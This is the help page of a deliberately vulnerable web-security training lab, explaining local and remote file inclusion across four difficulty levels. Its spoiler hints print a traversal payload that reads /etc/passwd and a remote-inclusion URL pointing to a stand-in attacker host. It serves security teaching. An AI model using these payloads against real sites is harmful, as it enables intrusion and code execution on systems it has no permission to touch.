<div class="body_padded">
	<h1>Help - File Inclusion</h1>

	<div id="code">
	<table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
	<tr>
	<td><div id="code">
		<h3>About</h3>
		<p>Some web applications allow the user to specify input that is used directly into file streams or allows the user to upload files to the server.
			At a later time the web application accesses the user supplied input in the web applications context. By doing this, the web application is allowing
			the potential for malicious file execution.</p>

		<p>If the file chosen to be included is local on the target machine, it is called "Local File Inclusion (LFI). But files may also be included on other
			machines, which then the attack is a "Remote File Inclusion (RFI).</p>

		<p>When RFI is not an option. using another vulnerability with LFI (such as file upload and directory traversal) can often achieve the same effect.</p>

		<p>Note, the term "file inclusion" is not the same as "arbitrary file access" or "file disclosure".</p>

		<br /><hr /><br />

		<h3>Objective</h3>
		<p>Read all <u>five</u> famous quotes from '<a href="../hackable/flags/fi.php">../hackable/flags/fi.php</a>' using only the file inclusion.</p>

		<br /><hr /><br />

		<h3>Low Level</h3>
		<p>This allows for direct input into <u>one of many PHP functions</u> that will include the content when executing.</p>

		<p>Depending on the web service configuration will depend if RFI is a possibility.</p>
		<pre>Spoiler: <span class="spoiler">LFI: ?page=../../../../../../etc/passwd</span>.
			Spoiler: <span class="spoiler">RFI: ?page=http://www.evilsite.com/evil.php</span>.</pre>

		<br />

		<h3>Medium Level</h3>
		<p>The developer has read up on some of the issues with LFI/RFI, and decided to filter the input. However, the patterns that are used, isn't enough.</p>
		<pre>Spoiler: <span class="spoiler">LFI: Possible, due to it only cycling through the pattern matching once</span>.
			Spoiler: <span class="spoiler">RFI: <?php echo hackcytesExternalLinkUrlGet( 'https://secure.php.net/manual/en/wrappers.php', 'PHP Streams' ); ?></span>.</pre>

		<br />

		<h3>High Level</h3>
		<p>The developer has had enough. They decided to only allow certain files to be used. However as there are multiple files with the same basename,
			they use a wildcard to include them all.</p>
		<pre>Spoiler: <span class="spoiler">LFI: The filename only has start with a certain value.</span>.
			Spoiler: <span class="spoiler">RFI: Need to link in another vulnerability, such as file upload</span>.</pre>

		<br />

		<h3>Impossible Level</h3>
		<p>The developer calls it quits and hardcodes only the allowed pages, with there exact filenames. By doing this, it removes all avenues of attack.</p>
	</div></td>
	</tr>
	</table>

	</div>

	<br />

	<p>Reference: <?php echo hackcytesExternalLinkUrlGet( 'https://en.wikipedia.org/wiki/Remote_File_Inclusion', 'Wikipedia - File inclusion vulnerability' ); ?></p>
	<p>Reference: <?php echo hackcytesExternalLinkUrlGet( 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion', 'WSTG - Local File Inclusion' ); ?></p>
	<p>Reference: <?php echo hackcytesExternalLinkUrlGet( 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion', 'WSTG - Remote File Inclusion' ); ?></p>
	<p>Reference: <?php echo hackcytesExternalLinkUrlGet( 'https://owasp.org/www-community/vulnerabilities/PHP_File_Inclusion', 'PHP File Inclusion' ); ?></p>

</div>
